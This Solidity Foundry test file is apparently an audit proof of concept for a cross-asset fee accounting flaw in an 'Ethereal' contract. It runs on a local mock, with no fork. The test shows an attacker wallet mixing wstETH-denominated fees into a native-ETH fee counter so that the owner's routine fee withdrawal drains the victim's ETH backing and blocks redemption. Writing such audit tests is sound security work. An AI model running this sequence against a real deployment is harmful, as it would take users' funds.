// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/ethereal.sol";

// C1: Shared `fees` accumulator mixes native-ETH-wei fees (_redeemEth) with
// wstETH-token-unit fees (_redeemWstEth) into one counter. withdrawFees() pays the
// whole sum out as NATIVE ETH. In a mixed deployment the wstETH-denominated fee is
// paid out in native ETH that was actually backing outstanding ETH gems -> insolvency.
//
// This PoC does NOT fork. It deploys Ethereal + a minimal 1:1 mock wstETH locally.
// Owner-only calls (setWstEth/createCollection/createGem) are legitimate protocol
// configuration in setUp(). The exploit itself is driven by unprivileged wallets
// (attacker arms the fee, victim loses backing); owner's routine withdrawFees() is
// the trigger.

interface IEthereal {
    function mint(uint256 _id, address _recipient) external payable returns (uint256);
    function redeem(uint256 _tokenId) external;
    function fees() external view returns (uint256);
    function withdrawFees() external;
    function getTokenBalance(uint256) external view returns (uint256);
}

// Minimal mock wstETH: payable receive() mints 1:1 to the sender (Ethereal), plus the
// bits of the IwstETH interface that Ethereal actually touches (balanceOf, transfer).
contract MockWstETH {
    mapping(address => uint256) public bal;

    receive() external payable {
        // 1:1 mint of mock-wstETH to whoever forwarded the ETH (the Ethereal contract)
        bal[msg.sender] += msg.value;
    }

    function balanceOf(address a) external view returns (uint256) {
        return bal[a];
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(bal[msg.sender] >= amount, "wst: insufficient");
        bal[msg.sender] -= amount;
        bal[to] += amount;
        return true;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(bal[from] >= amount, "wst: insufficient");
        bal[from] -= amount;
        bal[to] += amount;
        return true;
    }

    function getStETHByWstETH(uint256 amount) external pure returns (uint256) {
        return amount;
    }

    function getWstETHByStETH(uint256 amount) external pure returns (uint256) {
        return amount;
    }

    function stEthPerToken() external pure returns (uint256) {
        return 1e18;
    }
}

contract EtherealC1PoC is Test {
    Ethereal ethereal;
    MockWstETH mockWst;

    address owner = makeAddr("owner"); // deployer / protocol operator
    address victim = makeAddr("victim"); // honest ETH-gem holder
    address attacker = makeAddr("attacker"); // fresh, unprivileged

    uint256 ethGemId; // gem id for the ETH-backed collection
    uint256 wstGemId; // gem id for the wstETH-backed collection

    uint256 constant DENOM = 1e18;
    uint256 constant REDEEM_FEE = 500; // 5% (3-decimal: 100 = 1%)

    function setUp() public {
        vm.label(owner, "owner");
        vm.label(victim, "victim");
        vm.label(attacker, "attacker");

        // ---- Legitimate owner protocol configuration (NOT the exploit) ----
        vm.startPrank(owner);
        ethereal = new Ethereal();
        mockWst = new MockWstETH();
        ethereal.setWstEth(address(mockWst));

        // collection0: ETH-backed (ethereum = true), no validator
        uint256 cEth = ethereal.createCollection("Eth", false, address(0), true, "eth://");
        // collection1: wstETH-backed (ethereum = false), no validator
        uint256 cWst = ethereal.createCollection("Wst", false, address(0), false, "wst://");

        ethGemId = ethereal.createGem(cEth, DENOM, REDEEM_FEE, true);
        wstGemId = ethereal.createGem(cWst, DENOM, REDEEM_FEE, true);
        vm.stopPrank();
    }

    function test_exploit_crossAssetInsolvency() public {
        IEthereal e = IEthereal(address(ethereal));

        // ---- Step 1: victim mints an ETH gem. Contract now holds 1e18 native ETH
        //              that is the backing for the victim's gem. ----
        vm.deal(victim, DENOM);
        vm.prank(victim);
        uint256 victimToken = e.mint{value: DENOM}(ethGemId, victim);

        uint256 ethBackingOutstanding = ethereal.getTokenBalance(victimToken); // = 1e18
        assertEq(address(ethereal).balance, DENOM, "contract should hold victim's 1e18 ETH backing");
        assertEq(ethBackingOutstanding, DENOM, "victim gem backed by 1e18");

        // ---- Step 2: attacker (fresh wallet) arms the shared `fees` counter with
        //              wstETH-UNIT fees by minting + redeeming wstETH gems. Two cycles
        //              so the mixed-unit fee exceeds the victim gem's own ETH fee
        //              cushion and the victim redeem actually reverts. ----
        uint256 cycles = 2;
        vm.deal(attacker, DENOM * cycles);
        for (uint256 i = 0; i < cycles; i++) {
            vm.prank(attacker);
            uint256 t = e.mint{value: DENOM}(wstGemId, attacker);
            // minting forwarded the 1e18 ETH out to the mock wstETH; native ETH held
            // by the contract is unchanged (still the victim's 1e18 backing).
            assertEq(address(ethereal).balance, DENOM, "wstETH mint must not change native ETH held");
            vm.prank(attacker);
            e.redeem(t); // _redeemWstEth: fees += redeemFee (in wstETH UNITS)
        }

        // `fees` now holds a wstETH-denominated number, but the counter is asset-blind.
        uint256 fees = e.fees();
        assertEq(fees, (DENOM * REDEEM_FEE / 1e4) * cycles, "fees armed in wstETH units");
        // contract native ETH still exactly the victim's backing; wstETH fee sits in
        // the mock as wstETH, never leaves.
        assertEq(address(ethereal).balance, ethBackingOutstanding, "native ETH untouched by wst activity");

        // ---- Step 3: owner performs the routine fee withdrawal. It pays `fees` as
        //              NATIVE ETH -- drawn from the victim's ETH backing. ----
        vm.prank(owner);
        e.withdrawFees();

        uint256 contractEthAfter = address(ethereal).balance;

        // ---- INVARIANT BREAK #1: native ETH held < outstanding ETH-gem backing ----
        assertLt(
            contractEthAfter,
            ethBackingOutstanding,
            "INVARIANT: native ETH held must cover outstanding ETH-gem backing"
        );

        // ---- INVARIANT BREAK #2: the honest ETH-gem holder can no longer redeem.
        //      _redeemEth tries msg.sender.call{value: denom - fee} and reverts for
        //      insufficient ETH -> concrete, realized loss of user funds. ----
        uint256 victimPayout = DENOM - (DENOM * REDEEM_FEE / 1e4); // 0.95e18 owed to victim
        assertLt(contractEthAfter, victimPayout, "contract cannot even cover victim net payout");

        vm.prank(victim);
        vm.expectRevert(); // _redeemEth call{value:...} fails for lack of ETH
        e.redeem(victimToken);

        emit log_named_uint("ETH backing outstanding (before)", ethBackingOutstanding);
        emit log_named_uint("fees armed (wstETH units)       ", fees);
        emit log_named_uint("contract ETH after withdrawFees ", contractEthAfter);
        emit log_named_uint("victim net payout owed          ", victimPayout);
    }
}
